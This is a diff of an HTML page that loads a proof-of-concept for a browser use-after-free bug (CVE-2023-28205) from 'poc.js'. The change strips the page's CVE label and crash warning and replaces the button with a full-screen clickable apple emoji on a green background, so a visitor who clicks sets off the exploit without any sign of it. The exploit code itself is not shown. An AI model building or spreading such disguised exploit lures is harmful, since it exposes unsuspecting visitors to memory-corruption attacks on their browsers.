@@ -1,17 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bug C9880DE</title>
+  <meta charset="UTF-8">
+  <title>🍎</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #ccffcc; /* салатовый */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-size: 40vw; /* адаптивный размер яблока */
+      cursor: pointer;
+      user-select: none;
+    }
+  </style>
 </head>
 <body>
-    <h1>UAF: CVE-2023-28205</h1>
-    <p>Click the button to see the bug in action. (Browser crashes or [+] idx: 0x0)</p>
-    <button id="button">Click me</button>
-    <script type="module">
-        import { main } from './poc.js';
-        document.getElementById('button').addEventListener('click', main);
-    </script>
+  <div id="button">🍎</div>
+
+  <script type="module">
+    import { main } from './poc.js';
+    document.getElementById('button').addEventListener('click', main);
+  </script>
 </body>
 </html>
